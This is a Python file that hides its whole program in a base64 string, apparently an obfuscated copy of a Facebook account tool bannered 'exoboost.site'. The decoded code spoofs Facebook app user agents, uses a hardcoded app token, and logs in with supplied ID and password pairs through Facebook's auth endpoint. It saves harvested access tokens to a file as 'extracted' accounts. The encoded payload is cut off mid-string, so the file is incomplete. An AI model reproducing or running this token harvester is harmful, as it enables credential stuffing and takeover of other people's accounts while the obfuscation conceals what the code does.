# Hidden Code Executor
# This file contains a hidden version of annixxy
import base64
_ = base64.b64decode("""CmltcG9ydCByZXF1ZXN0cwppbXBvcnQgcmUKaW1wb3J0IG9zCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIGJzCmltcG9ydCByYW5kb20KaW1wb3J0IHVybGxpYjMKZnJvbSBtYWhkaXggaW1wb3J0ICoKZnJvbSB0aW1lIGltcG9ydCBzbGVlcApmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yCmltcG9ydCB0aHJlYWRpbmcKY2xlYXIoKQppbXBvcnQgb3MKZnJvbSBtYWhkaXggaW1wb3J0ICoKZnJvbSB0aW1lIGltcG9ydCBzbGVlcCBhcyBzbHAKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvcgppbXBvcnQgcmUKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCByYW5kb20KaW1wb3J0IGpzb24KaW1wb3J0IHJlcXVlc3RzCmltcG9ydCB1dWlkCmltcG9ydCBzdHJpbmcKaW1wb3J0IGJhc2U2NAppbXBvcnQgdXJsbGliCmltcG9ydCB1cmxsaWIzCmltcG9ydCByZQppbXBvcnQgb3MKaW1wb3J0IHRpbWUKaW1wb3J0IHN5cwpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQpmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCB1cmxvcGVuCmZyb20gdGltZSBpbXBvcnQgc2xlZXAgYXMgc2xwCmltcG9ydCByZQppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGpzb24KaW1wb3J0IG9zCmltcG9ydCByYW5kb20KaW1wb3J0IHN0cmluZwppbXBvcnQgdXVpZAppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGpzb24KaW1wb3J0IHRpbWUKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciwgYXNfY29tcGxldGVkCmZyb20gcGF0aGxpYiBpbXBvcnQgUGF0aAppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGpzb24KaW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHBsYXRmb3JtCmltcG9ydCByZQpwdXJwbGUgPSAiXDAzM1sxOzM1bSIKdmlvbGV0X2NodSA9ICJcMDMzWzE7MzVtIgpkYXJrYmx1ZSA9ICJcMDMzWzM0bSIKZ3JlZW4gPSAiXDAzM1sxOzMybSIKcmVkID0gIlwwMzNbMTszMW0iCnllbGxvdyA9ICJcMDMzWzE7MzNtIgpza3libHVlID0gIlwwMzNbMTszNm0iCmJsdWUgPSAiXDAzM1sxOzM0bSIKbGlnaHRibHVlID0gIlwwMzNbMzg7NTs4MW0iCmhvdHBpbmsgPSAiXDAzM1szODs1OzE5N20iCmxpZ2h0X21hZ2VudGEgPSAiXDAzM1szODs1OzE3NG0iCndoaXRlID0gIlwwMzNbMTszN20iCmxhdmVuZGVyID0gIlwwMzNbMzg7NTsxODltIgpyYXNwID0gIlwwMzNbMzg7NTsyMm0iCmRhcmtibHVlID0gIlwwMzNbMzRtIgpncmVlbiA9ICJcMDMzWzE7MzJtIgpyZWQgPSAiXDAzM1sxOzMxbSIKeWVsbG93ID0gIlwwMzNbMTszM20iCnNreWJsdWUgPSAiXDAzM1sxOzM2bSIKYmx1ZSA9ICJcMDMzWzE7MzRtIgpsaWdodGJsdWUgPSAiXDAzM1szODs1OzgxbSIKd2hpdGUgPSAiXDAzM1sxOzM3bSIKUj0iW2JvbGQgcmVkXSIKRz0iW2JvbGQgZ3JlZW5dIgpZPSJbYm9sZCB5ZWxsb3ddIgpCPSJbYm9sZCBibHVlXSIKTT0iW2JvbGQgbWFnZW50YV0iClA9Iltib2xkIHZpb2xldF0iCkM9Iltib2xkIGN5YW5dIgpXPSJbYm9sZCB3aGl0ZV0iCnI9IlwwMzNbMTszMW0iCmc9IlwwMzNbMTszMm0iCnk9IlwwMzNbMTszM20iCmI9IlwwMzNbMTszNG0iCm09IlwwMzNbMTszNW0iCmM9IlwwMzNbMTszNm0iCnc9IlwwMzNbMTszN20iCmltcG9ydCByZQppbXBvcnQgcmUKaW1wb3J0IHJlcXVlc3RzCgpkZWYgZ2V0X2NvbWJpbmVkX2RhdGEodXJsKToKICAgICIiIgogICAgRmV0Y2ggdGhlIHJlc3BvbnNlIGZyb20gdGhlIGdpdmVuIFVSTCBhbmQgZXh0cmFjdCB0aGUgYGFjdHJzYCBudW1iZXIgYW5kIGBwb3N0X2lkYC4KICAgIENvbWJpbmUgdGhlc2UgdmFsdWVzIGFuZCByZXR1cm4gdGhlIHJlc3VsdC4KCiAgICBBcmdzOgogICAgICAgIHVybCAoc3RyKTogVGhlIFVSTCB0byBmZXRjaCBkYXRhIGZyb20uCgogICAgUmV0dXJuczoKICAgICAgICBzdHI6IFRoZSBjb21iaW5lZCBzdHJpbmcgb2YgYGFjdHJzYCBudW1iZXIgYW5kIGBwb3N0X2lkYCwgb3IgYW4gZXJyb3IgbWVzc2FnZS4KICAgICIiIgogICAgaGVhZGVycyA9IHsKICAgICAgICAnVXNlci1BZ2VudCc6ICJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC4wLjAgU2FmYXJpLzUzNy4zNiIsCiAgICAgICAgJ0FjY2VwdCc6ICJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjciLAogICAgICAgICdjYWNoZS1jb250cm9sJzogIm1heC1hZ2U9MCIsCiAgICAgICAgJ2Rwcic6ICIyIiwKICAgICAgICAndmlld3BvcnQtd2lkdGgnOiAiOTgwIiwKICAgICAgICAnc2VjLWNoLXVhJzogIlwiR29vZ2xlIENocm9tZVwiO3Y9XCIxMzFcIiwgXCJDaHJvbWl1bVwiO3Y9XCIxMzFcIiwgXCJOb3RfQSBCcmFuZFwiO3Y9XCIyNFwiIiwKICAgICAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICI/MCIsCiAgICAgICAgJ3NlYy1jaC11YS1wbGF0Zm9ybSc6ICJcIkxpbnV4XCIiLAogICAgICAgICdzZWMtY2gtdWEtcGxhdGZvcm0tdmVyc2lvbic6ICJcIlwiIiwKICAgICAgICAnc2VjLWNoLXVhLW1vZGVsJzogIlwiXCIiLAogICAgICAgICdzZWMtY2gtdWEtZnVsbC12ZXJzaW9uLWxpc3QnOiAiXCJHb29nbGUgQ2hyb21lXCI7dj1cIjEzMS4wLjY3NzguMTA0XCIsIFwiQ2hyb21pdW1cIjt2PVwiMTMxLjAuNjc3OC4xMDRcIiwgXCJOb3RfQSBCcmFuZFwiO3Y9XCIyNC4wLjAuMFwiIiwKICAgICAgICAnc2VjLWNoLXByZWZlcnMtY29sb3Itc2NoZW1lJzogImxpZ2h0IiwKICAgICAgICAndXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyc6ICIxIiwKICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAic2FtZS1vcmlnaW4iLAogICAgICAgICdzZWMtZmV0Y2gtbW9kZSc6ICJuYXZpZ2F0ZSIsCiAgICAgICAgJ3NlYy1mZXRjaC11c2VyJzogIj8xIiwKICAgICAgICAnc2VjLWZldGNoLWRlc3QnOiAiZG9jdW1lbnQiLAogICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAiZW4tVVMsZW47cT0wLjkiLAogICAgICAgICdwcmlvcml0eSc6ICJ1PTAsIGkiLAogICAgICAgICdDb29raWUnOiAic2I9ZnVaVFo4WnlsOWRYajVURm9kbHhEckdEOyBkcHI9Mjsgd2Q9OTgweDE2Mjg7IGRhdHI9ZnVaVFp4TC1ndGJCalRrZmVCcS1WVkRaIgogICAgfQoKICAgIHRyeToKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwsIGhlYWRlcnM9aGVhZGVycykudGV4dAoKICAgICAgICAjIEV4dHJhY3QgYGFjdHJzYCBudW1iZXIKICAgICAgICBhY3Ryc19tYXRjaCA9IHJlLnNlYXJjaChyJyJhY3Ryc1xcIjpcXCIoXGQrKVxcIicsIHJlc3BvbnNlKQogICAgICAgIGFjdHJzX251bWJlciA9IGFjdHJzX21hdGNoLmdyb3VwKDEpIGlmIGFjdHJzX21hdGNoIGVsc2UgTm9uZQoKICAgICAgICAjIEV4dHJhY3QgYHBvc3RfaWRgCiAgICAgICAgcG9zdF9pZF9tYXRjaCA9IHJlc3BvbnNlLnNwbGl0KCcicG9zdF9pZCI6IicpWzFdLnNwbGl0KCciJylbMF0gaWYgJyJwb3N0X2lkIjoiJyBpbiByZXNwb25zZSBlbHNlIE5vbmUKCiAgICAgICAgaWYgYWN0cnNfbnVtYmVyIGFuZCBwb3N0X2lkX21hdGNoOgogICAgICAgICAgICByZXR1cm4gZiJ7YWN0cnNfbnVtYmVyfV97cG9zdF9pZF9tYXRjaH0iCiAgICAgICAgZWxpZiBub3QgYWN0cnNfbnVtYmVyOgogICAgICAgICAgICByZXR1cm4gImFjdHJzIG51bWJlciBub3QgZm91bmQhIgogICAgICAgIGVsaWYgbm90IHBvc3RfaWRfbWF0Y2g6CiAgICAgICAgICAgIHJldHVybiAicG9zdF9pZCBub3QgZm91bmQhIgoKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gZiJBbiBlcnJvciBvY2N1cnJlZDoge3N0cihlKX0iCmRlZiBleHRyYWN0X2ZhY2Vib29rX3ZpZGVvX2lkKHVybCk6CiAgICAjIFJlZ3VsYXIgZXhwcmVzc2lvbiBwYXR0ZXJuIHRvIG1hdGNoIHRoZSB1c2VyIElEIGFuZCB2aWRlbyBJRAogICAgcGF0dGVybiA9IHInZmFjZWJvb2tcLmNvbS8oXGQrKS92aWRlb3MvKFxkKykvJwogICAgCiAgICAjIFNlYXJjaCBmb3IgdGhlIHBhdHRlcm4gaW4gdGhlIFVSTAogICAgbWF0Y2ggPSByZS5zZWFyY2gocGF0dGVybiwgdXJsKQogICAgCiAgICBpZiBtYXRjaDoKICAgICAgICAjIEV4dHJhY3QgdGhlIHVzZXIgSUQgYW5kIHZpZGVvIElECiAgICAgICAgdXNlcl9pZCwgdmlkZW9faWQgPSBtYXRjaC5ncm91cHMoKQogICAgICAgIHJldHVybiBmInt1c2VyX2lkfV97dmlkZW9faWR9IgogICAgZWxzZToKICAgICAgICByZXR1cm4gTm9uZQoKIyBFeGFtcGxlIHVzYWdlOgoKCmRlZiBleHRyYWN0X2lkcyh1cmwpOgogICAgZ3JvdXBfcGF0dGVybiA9IHInZ3JvdXBzLyhcZCspL3Blcm1hbGluay8oXGQrKS8nCiAgICBwb3N0X3BhdHRlcm4gPSByJyhcZCspL3Bvc3RzLyhcZCspLycKICAgIHBob3RvX3BhdHRlcm4gPSByJ2ZiaWQ9KFxkKyknCgogICAgZ3JvdXBfbWF0Y2ggPSByZS5zZWFyY2goZ3JvdXBfcGF0dGVybiwgdXJsKQogICAgcG9zdF9tYXRjaCA9IHJlLnNlYXJjaChwb3N0X3BhdHRlcm4sIHVybCkKICAgIHBob3RvX21hdGNoID0gcmUuc2VhcmNoKHBob3RvX3BhdHRlcm4sIHVybCkKCiAgICBpZiBncm91cF9tYXRjaDoKICAgICAgICBncm91cF9pZCwgcG9zdF9pZCA9IGdyb3VwX21hdGNoLmdyb3VwcygpCiAgICAgICAgcmV0dXJuIGYie2dyb3VwX2lkfV97cG9zdF9pZH0iCiAgICBlbGlmIHBvc3RfbWF0Y2g6CiAgICAgICAgZ3JvdXBfaWQsIHBvc3RfaWQgPSBwb3N0X21hdGNoLmdyb3VwcygpCiAgICAgICAgcmV0dXJuIGYie2dyb3VwX2lkfV97cG9zdF9pZH0iCiAgICBlbGlmIHBob3RvX21hdGNoOgogICAgICAgIHBob3RvX2lkID0gcGhvdG9fbWF0Y2guZ3JvdXAoMSkKICAgICAgICByZXR1cm4gcGhvdG9faWQKICAgIGVsc2U6CiAgICAgICAgcmV0dXJuIE5vbmUgCmRlZiBnZXRfYXBwcm92YWxfZGF0YSh1cmwpOgogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsKQogICAgcmVzcG9uc2UucmFpc2VfZm9yX3N0YXR1cygpCiAgICByZXR1cm4gcmVzcG9uc2UudGV4dAoKICAgIApkZWYgam92YW4oKToKICAgIGFkcmt6ID0gIlwwMzNbMzRtICIKICAgIAogICAgCiAgICBwcmludChmIiIiCiAgICB7Z3JlZW59IAogICAgICAgICAgICAgICAgCgogICAgICAgICAgIOKWkeKWiOKWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKWiOKVl+KWkeKWkeKWkeKWiOKWiOKWiOKVl+KWiOKWiOKVl+KWiOKWiOKWiOKVl+KWkeKWkeKWiOKWiOKVl+KWkeKWiOKWiOKWiOKWiOKWiOKWiOKVlwogICAgICAgICAgIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVnQogICAgICAgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVkeKWkeKWkeKWiOKWiOKVkeKWiOKWiOKVlOKWiOKWiOKWiOKWiOKVlOKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVlOKWiOKWiOKVl+KWiOKWiOKVkeKVmuKWiOKWiOKWiOKWiOKWiOKVl+KWkQogICAgICAgICAgIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVkeKWkeKWkeKWiOKWiOKVkeKWiOKWiOKVkeKVmuKWiOKWiOKVlOKVneKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVkeKVmuKWiOKWiOKWiOKWiOKVkeKWkeKVmuKVkOKVkOKVkOKWiOKWiOKVlwogICAgICAgICAgIOKWiOKWiOKVkeKWkeKWkeKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVkeKWkeKVmuKVkOKVneKWkeKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVkeKWkeKVmuKWiOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnQogICAgICAgICAg4pWa4pWQ4pWd4paR4paR4pWa4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paR4pWa4pWQ4pWd4paR4paR4paR4paR4paR4pWa4pWQ4pWd4pWa4pWQ4pWd4pWa4pWQ4pWd4paR4paR4pWa4pWQ4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paRCiAgICAgICAgICAgICAgICAge3doaXRlfSBodHRwczovL2V4b2Jvb3N0LnNpdGUKICAgICB7cmVkfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0KICAgICB7cmVkfU9XTkVSICAgICB7d2hpdGV9OiB7eWVsbG93fSBGcmFjayAgCiAgICAge3JlZH1GQUNFQk9PSyAge3doaXRlfToge3llbGxvd30gTm9uZQogICAgIHtyZWR94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIiIikKCmltcG9ydCBvcwppbXBvcnQgdGltZQppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGxvZ2dpbmcKCmRlZiBnZXRfYXBwcm92YWxfZGF0YSh1cmwpOgogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsKQogICAgcmVzcG9uc2UucmFpc2VfZm9yX3N0YXR1cygpCiAgICByZXR1cm4gcmVzcG9uc2UudGV4dAoKCgpkZWYgV191ZXJhZ250KCk6CiAgICBjaHJvbWVfdmVyc2lvbiA9IHJhbmRvbS5yYW5kaW50KDgwLCA5OSkKICAgIHdlYmtpdF92ZXJzaW9uID0gcmFuZG9tLnJhbmRpbnQoNTAwLCA1OTkpCiAgICBzYWZhcmlfdmVyc2lvbiA9IHJhbmRvbS5yYW5kaW50KDQwMCwgNDk5KQogICAgd2luZG93c192ZXJzaW9uID0gcmFuZG9tLnJhbmRpbnQoOCwgMTApCiAgICBpc193aW42NCA9IHJhbmRvbS5jaG9pY2UoWwogICAgICAgIFRydWUsCiAgICAgICAgRmFsc2VdKQogICAgaWYgaXNfd2luNjQ6CiAgICAgICAgaWYgbm90ICdXT1c2NDsnOgogICAgICAgICAgICB1c2VyX2FnZW50ID0gZicnJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIHt3aW5kb3dzX3ZlcnNpb259LnsnJ31XaW42NDsgeDY0KSBBcHBsZVdlYktpdC97d2Via2l0X3ZlcnNpb259LjAgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUve2Nocm9tZV92ZXJzaW9ufS4wLjAuMCBTYWZhcmkve3NhZmFyaV92ZXJzaW9ufS4wJycnCiAgICAgICAgICAgIHJldHVybiB1c2VyX2FnZW50CmltcG9ydCBvcwppbXBvcnQgdXVpZAppbXBvcnQgcmFuZG9tCmltcG9ydCByZXF1ZXN0cwppbXBvcnQganNvbgpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yLCBhc19jb21wbGV0ZWQKaW1wb3J0IHN0cmluZyAgIyBBZGRlZCBmb3IgZ2VuZXJhdGluZyByYW5kb20gY2hhcmFjdGVycyBpbiBnZXRfdWEoKQoKaW1wb3J0IG9zCgppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHRocmVhZGluZwpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yCmltcG9ydCByYW5kb20KaW1wb3J0IHRpbWUKaW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHBsYXRmb3JtCiMgQ29sb3IgY29kZXMgZm9yIGZvcm1hdHRpbmcgb3V0cHV0CnB1cnBsZSA9ICJcMDMzWzE7MzVtIgpibHVlID0gIlwwMzNbMzRtIgpncmVlbiA9ICJcMDMzWzE7MzJtIgpyZWQgPSAiXDAzM1sxOzMxbSIKeWVsbG93ID0gIlwwMzNbMTszM20iCndoaXRlID0gIlwwMzNbMTszN20iCmltcG9ydCByYW5kb20KaW1wb3J0IHN0cmluZwpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBpZiAndGVybXV4JyBpbiBwbGF0Zm9ybS5zeXN0ZW0oKS5sb3dlcigpOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgZWxpZiBwbGF0Zm9ybS5zeXN0ZW0oKS5sb3dlcigpID09ICd3aW5kb3dzJzoKICAgICAgICBvcy5zeXN0ZW0oJ2NscycpCiAgICBlbHNlOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQpkZWYgZ2VuZXJhdGVfdXNlcl9hZ2VudCgpOgogICAgZmJhdiA9IGYie3JhbmRvbS5yYW5kaW50KDExMSwgOTk5KX0uMC4wLntyYW5kb20ucmFuZGludCgxMSwgOTkpfS57cmFuZG9tLnJhbmRpbnQoMTExLCA5OTkpfSIKICAgIGZiYnYgPSBzdHIocmFuZG9tLnJhbmRpbnQoMTExMTExMTExLCA5OTk5OTk5OTkpKQogICAgZmJydiA9ICcwJwogICAgcmFuZG9tX3NlZWQgPSByYW5kb20uUmFuZG9tKCkKICAgIGFkaWQgPSAnJy5qb2luKHJhbmRvbV9zZWVkLmNob2ljZXMoc3RyaW5nLmhleGRpZ2l0cywgaz0xNikpCgogICAgIyBSYW5kb21seSB2YXJ5IHRoZSBBbmRyb2lkIE9TIHZlcnNpb24sIGRldmljZSwgYW5kIGFwcCB2ZXJzaW9uIGZvciByZWFsaXNtCiAgICBkZXZpY2UgPSByYW5kb20uY2hvaWNlKFsiSFVBV0VJIE1BUi1MWDFNIiwgIlNhbXN1bmcgU00tRzk2MEYiLCAiT25lUGx1cyBHTTE5MTMiXSkKICAgIGZiYXZfdmVyc2lvbiA9IHN0cihyYW5kb20ucmFuZGludCg0OSwgMTUwKSkgICMgVXBkYXRlZCByYW5nZSBmb3IgRkJBViB2ZXJzaW9ucwogICAgZmJidl92ZXJzaW9uID0gc3RyKHJhbmRvbS5yYW5kaW50KDExMTExMTExLCA3Nzc3Nzc3NykpCiAgICBjYXJyaWVyID0gcmFuZG9tLmNob2ljZShbIk9vcmVkb28gVE4iLCAiT3JhbmdlIiwgIlZvZGFmb25lIiwgIlQtTW9iaWxlIl0pCgogICAgdWFfYmdyYXBoID0gZidbRkJBTi9GQjRBO0ZCQVYve2ZiYXZfdmVyc2lvbn0uMC4wLntyYW5kb20ucmFuZHJhbmdlKDIwLCA0OSl9LntyYW5kb20ucmFuZGludCgxMSwgOTkpfTtGQkJWL3tmYmJ2X3ZlcnNpb259OycgXAogICAgICAgICAgICAgICAgZidbRkJBTi9GQjRBO0ZCQVYve2ZiYXZ9O0ZCQlYve2ZiYnZ9O0ZCRE0ve3tkZW5zaXR5PTMuMCx3aWR0aD0xMDgwLGhlaWdodD0yMTA3fX07RkJMQy9mcl9GUjsnIFwKICAgICAgICAgICAgICAgIGYnRkJSVi97ZmJydn07RkJDUi97Y2Fycmllcn07RkJNRi97ZGV2aWNlLnNwbGl0KCIgIilbMF19O0ZCQkQve2RldmljZS5zcGxpdCgiICIpWzBdfTsnIFwKICAgICAgICAgICAgICAgIGYnRkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYve2RldmljZX07RkJTVi85O0ZCT1AvMTtGQkNBL2FybTY0LXY4YTpdJwogICAgCiAgICByZXR1cm4gdWFfYmdyYXBoCgp1YV9iZ3JhcGggPSBnZW5lcmF0ZV91c2VyX2FnZW50KCkKCgppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHJhbmRvbQppbXBvcnQgY29uY3VycmVudC5mdXR1cmVzIGFzIHRocmVhZAppbXBvcnQgb3MKaW1wb3J0IHN0cmluZwoKIyBSYW5kb20gRkIgdmVyc2lvbiBnZW5lcmF0aW9uCmZiYXYgPSBmJ3tyYW5kb20ucmFuZGludCgxMTEsIDk5OSl9LjAuMC57cmFuZG9tLnJhbmRpbnQoMTEsIDk5KX0ue3JhbmRvbS5yYW5kaW50KDExMSwgOTk5KX0nCmZiYnYgPSBzdHIocmFuZG9tLnJhbmRpbnQoMTExMTExMTExLCA5OTk5OTk5OTkpKQpmYnJ2ID0gJzAnCnJhbmRvbV9zZWVkID0gcmFuZG9tLlJhbmRvbSgpCmFkaWQgPSAnJy5qb2luKHJhbmRvbV9zZWVkLmNob2ljZXMoc3RyaW5nLmhleGRpZ2l0cywgaz0xNikpCgojIFVzZXIgYWdlbnQgc3RyaW5nCnVhX2JncmFwaCA9ICdbRkJBTi9GQjRBO0ZCQVYvJyArIHN0cihyYW5kb20ucmFuZGludCg0OSwgNjYpKSArICcuMC4wLicgKyBzdHIocmFuZG9tLnJhbmRyYW5nZSgyMCwgNDkpKSArIHN0cihyYW5kb20ucmFuZGludCgxMSwgOTkpKSArICc7RkJCVi8nICsgc3RyKHJhbmRvbS5yYW5kaW50KDExMTExMTExLCA3Nzc3Nzc3NykpICsgJzsnICsgJ1tGQkFOL0ZCNEE7RkJBVi8nICsgZmJhdiArICc7RkJCVi8nICsgZmJidiArICc7RkJETS97ZGVuc2l0eT0zLjAsd2lkdGg9MTA4MCxoZWlnaHQ9MjEwN307RkJMQy9mcl9GUjtGQlJWLycgKyBmYnJ2ICsgJztGQkNSL09vcmVkb28gVE47RkJNRi9IVUFXRUk7RkJCRC9IVUFXRUk7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvTUFSLUxYMU07RkJTVi85O0ZCT1AvMTtGQkNBL2FybTY0LXY4YTpdJwoKZGVmIGJncmFwaCh1aWQsIHB3LCBwYXRoX2ZpbGUsIGV4dHJhY3RfdHlwZSwgc3VjY2Vzc19jb3VudCwgZXhpc3RpbmdfdWlkcyk6CiAgICBhY2Nlc3NUb2tlbiA9ICczNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInICAjIEV4YW1wbGUgdG9rZW4KCiAgICBkYXRhID0gewogICAgICAgICdtZXRob2QnOiAnYXV0aC5sb2dpbicsCiAgICAgICAgJ2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSc6ICdhdXRoZW50aWNhdGUnLAogICAgICAgICdmYl9hcGlfY2FsbGVyX2NsYXNzJzogJ2NvbS5mYWNlYm9vay5hY2NvdW50LmxvZ2luLnByb3RvY29sLkZiNGFBdXRoSGFuZGxlcicsCiAgICAgICAgJ2FwaV9rZXknOiAnNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLAogICAgICAgICdlbWFpbCc6IHVpZCwKICAgICAgICAncGFzc3dvcmQnOiBwdywKICAgICAgICAnYWNjZXNzX3Rva2VuJzogYWNjZXNzVG9rZW4KICAgIH0KCiAgICB1cmwgPSAnaHR0cHM6Ly9iLWdyYXBoLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luP2luY2x1ZGVfaGVhZGVycz1mYWxzZSZkZWNvZGVfYm9keV9qc29uPWZhbHNlJnN0cmVhbWFibGVfanNvbl9yZXNwb25zZT10cnVlJwoKICAgIHRyeToKICAgICAgICAKICAgICAgICBpZiB1aWQgaW4gZXhpc3RpbmdfdWlkczoKICAgICAgICAgICAgcHJpbnQoZiIgICAgIHt5ZWxsb3d9W0lORk9dIHtyZWR9QUNDT1VOVCAtLT4ge3doaXRlfXt1aWR9IHtyZWR9YWxyZWFkeSBleGlzdHMuIikKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICAgICAgcmV0dXJuCgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSkuanNvbigpCiAgICAgICAgCiAgICAgICAgcHJpbnQocmVzcG9uc2UpCiAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcmVzcG9uc2U6CiAgICAgICAgICAgIHRva2VuID0gcmVzcG9uc2VbJ2FjY2Vzc190b2tlbiddCgogICAgICAgICAgICB3aXRoIG9wZW4ocGF0aF9maWxlLCAnYScpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKGYie3VpZH18e3Rva2VufVxuIikKCiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgIHByaW50KGYiICAgICBcMDMzWzMybVtTVUNDRVNTXVwwMzNbMG06IEV4dHJhY3RlZCBBY2NvdW50IOKUgOKUgOKUgOKUgOKUgD4ge3VpZH0uIikKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilI